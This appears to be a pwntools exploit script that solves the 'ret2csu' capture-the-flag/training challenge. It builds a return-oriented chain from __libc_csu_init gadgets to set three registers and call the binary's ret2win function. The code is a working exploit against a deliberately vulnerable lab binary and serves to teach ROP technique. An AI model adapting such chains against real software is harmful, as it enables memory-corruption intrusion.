#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './ret2csu'
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
libr = './libret2csu.so'
libr = ELF(libr, checksec=False)
context.log_level = 'debug'

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x40069a
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
rop = ROP(exe)
csu1 = 0x40069a    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu2 = 0x400680    # mov rdx, r15; mov rsi, r14; mov edi, r13d; call QWORD PTR [r12+rbx*8]; ...csu1;
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

def csuPayload(rdi, rsi, rdx, next, ret):
    csu =  p64(csu1)      # STAGE 1
    csu += p64(0)         # rbx - set to 0 since it will be incremented later
    csu += p64(1)         # rbp - set to 1 so when compared to the incremented rbx, results in equality
    csu += p64(next)      # r12 = call QWORD PTR [r12+rbx*8]
    csu += p64(rdi)       # r13 = edi
    csu += p64(rsi)       # r14 = rsi
    csu += p64(rdx)       # r15 = rdx
    
    csu += p64(csu2)      # STAGE 2
    csu += p64(0)         # add rsp, 8 -> padding
    csu += p64(0) * 6     # rbx, rbp, r12, r13, r14, r15
    csu += p64(ret)
    
    return csu

def exploit():
    io = initialize()

    offset = 40
    params = [
        0xdeadbeefdeadbeef, 
        0xcafebabecafebabe, 
        0xd00df00dd00df00d
    ]
    ropchain = csuPayload(params[0], 
                        params[1], 
                        params[2], 
                        next=0x600e48,  # -> located on _DYNAMIC section, this particular index of such array holds a pointer to _fini which act as basically a ret;
                        ret=pop_rdi)
    ropchain += p64(params[0])
    ropchain += p64(elf.sym['ret2win'])
        
    payload = flat({offset: ropchain})
    io.sendlineafter(b'>', payload)

    io.interactive()
    
if __name__ == '__main__':
    exploit()